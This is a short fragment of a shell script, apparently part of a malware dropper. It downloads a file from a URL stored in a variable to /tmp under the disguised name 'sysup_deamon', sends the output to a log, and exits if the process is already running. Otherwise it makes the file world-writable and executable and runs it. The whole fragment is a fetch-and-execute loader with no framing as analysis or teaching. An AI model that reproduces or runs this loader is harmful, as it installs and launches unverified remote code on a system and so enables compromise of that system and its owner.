...
curl -o /tmp/sysup_deamon $pl_url 1>/tmp/tmplog0423231.log 2>&1
runCount2=$(ps -ef|grep sysup_deamon | grep -v grep -c)
if [ $runCount2 != 0 ];then
    echo "exit"
    exit
fi
chmod 777 /tmp/sysup_deamon 1>>/tmp/tmplog0423231.log 2>&1
/tmp/sysup_deamon 1>>/tmp/tmplog0423231.log 2>&1
